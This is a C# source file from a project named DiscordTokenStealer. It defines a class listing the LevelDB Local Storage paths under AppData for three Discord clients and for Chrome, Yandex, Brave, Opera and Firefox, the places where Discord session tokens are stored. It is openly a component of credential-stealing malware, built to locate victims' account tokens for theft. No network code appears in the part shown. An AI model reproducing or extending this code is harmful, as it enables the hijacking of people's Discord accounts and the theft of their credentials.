using DiscordTokenStealer.Helpers;

namespace DiscordTokenStealer.Discord;
public partial class LevelDatabaseProvider
{
    public readonly string Location;
    public readonly string SearchPattern;
    public bool Exists => Directory.Exists(Location);
    private static LevelDatabaseProvider? TryFind(string baseDir, string toFind, string searchPattern)
    {
        if (DirectoryHelper.TryFindSubDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), baseDir), toFind, out string? dir) && dir != null)
        {
            return new LevelDatabaseProvider(dir, searchPattern);
        }
        return null;
    }

    private LevelDatabaseProvider(string path, string searchPattern = "*.ldb")
    {
        Location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path);
        SearchPattern = searchPattern;
    }
}

public partial class LevelDatabaseProvider
{
    #region Discord Clients
    public static readonly LevelDatabaseProvider Discord = new("discord\\Local Storage\\leveldb");

    public static readonly LevelDatabaseProvider DiscordPTB = new("discordptb\\Local Storage\\leveldb");

    public static readonly LevelDatabaseProvider DiscordCanary = new("discordcanary\\Local Storage\\leveldb");
    #endregion

    #region Browsers
    public static readonly LevelDatabaseProvider GoogleChrome = new("Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDatabaseProvider Yandex = new("Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDatabaseProvider Brave = new("BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDatabaseProvider Opera = new("Opera Software\\Opera Stable\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly LevelDatabaseProvider? MozillaFirefox = TryFind("Mozilla\\Firefox\\Profiles", "storage\\default\\https+++discord.com\\ls", "*.sqlite");
    #endregion
}